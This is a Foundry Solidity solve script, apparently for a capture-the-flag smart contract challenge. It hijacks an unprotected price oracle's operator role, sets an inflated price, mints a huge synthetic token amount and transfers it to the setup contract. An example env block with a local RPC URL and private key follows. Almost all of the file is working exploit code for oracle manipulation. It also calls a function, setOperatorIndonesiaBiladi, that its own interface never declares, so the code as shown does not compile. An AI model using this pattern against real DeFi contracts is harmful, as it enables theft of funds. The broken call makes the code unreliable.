
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
interface Setup{
    function challenge() external returns (SynthIDR);
    function isSolved() external returns (bool);
}
contract PriceOracle {
 
    function setOperator(address _operator) external {
    }
    function setPrice(uint _price) external {
    }
}
contract SynthIDR {
    function openVault(uint256 _amountToMint) external payable {
    }
    function transfer(address _to, uint256 _amount) external returns (bool) {
        
    }
}


contract SolveScript is Script {
    function setUp() public {}

    function run() public {
        // Get environment variables
        string memory rpcUrl = vm.envString("RPC_URL");
        uint256 privkey = vm.envUint("PRIVKEY");
        address setupAddress = vm.envAddress("SETUP_CONTRACT_ADDR");
        // Set RPC URL
        vm.createSelectFork(rpcUrl);
        vm.startBroadcast(privkey);

        //interact
        address oracleAddress = 0xc256638034612C1a13a37cF0254967AEB902404E;
        PriceOracle oracle = PriceOracle(oracleAddress);
        oracle.setOperatorIndonesiaBiladi(vm.envAddress("WALLET_ADDR"));
        oracle.setPrice(1e55); 
        Setup setup = Setup(setupAddress);
        SynthIDR synth = setup.challenge();
        synth.openVault{value: 99 ether}(1e33); 
        synth.transfer(
            setupAddress, 
            1e33
        );
        require(setup.isSolved(), "Challenge not solved");

        vm.stopBroadcast();
    }
}

/* env file example
RPC_URL="http://localhost:48334/abdd7b67-1a88-4b8b-a5a1-4a3c37c51608"
PRIVKEY="0x34ab96218189060f60764d85825bb6a2c38baa8d2ebf9e8e3335e25c16591213"
SETUP_CONTRACT_ADDR="0xe6171E7b01D794b5d6e69B7d2791Ca0D75DFaC7B"
WALLET_ADDR="0xb71F48C5E0c861A276fFEc281921139012b1648d"
*/

/*
Usage : forge script thisFile.sol:SolveScript --broadcast 
*/